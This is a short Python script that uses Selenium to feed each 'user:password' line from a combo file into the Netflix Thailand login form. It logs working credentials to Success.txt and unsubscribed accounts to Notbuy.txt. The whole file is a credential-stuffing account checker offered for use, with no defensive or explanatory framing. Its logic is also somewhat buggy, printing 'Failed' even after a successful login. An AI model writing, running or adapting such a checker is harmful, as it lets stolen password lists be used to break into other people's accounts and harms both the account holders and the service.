import os
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
combo = open('listAcc.txt',"r", encoding="UTF-8").readlines()
for i in combo:
    user = i.split(':')[0]
    passw = i.split(':')[1]

    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--ssl-version-max=tls1.3")
    browser = webdriver.Chrome(chrome_options=chrome_options)
    browser.get('https://www.netflix.com/th/login')
    browser.find_element_by_xpath('//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/div[1]/div/div/label').send_keys(user)
    browser.find_element_by_xpath('//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/div[2]/div/div/label').send_keys(passw)
    browser.find_element_by_xpath('//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button').click()
    time.sleep(2)
    if browser.current_url == "https://www.netflix.com/browse":
        print('Success: '+user+':'+passw +"\n")
        Success = open('Success.txt','a')
        Success.write(user+':'+passw +"\n")
    if browser.current_url == "https://www.netflix.com/signup":
        print('NOt Buy: '+user+':'+passw)
        Notbuy = open('Notbuy.txt','a')
        Notbuy.write(user+':'+passw+'')
    else:
        print('Failed: '+user+':'+passw)
    browser.get('https://www.netflix.com/signout')
    browser.close()


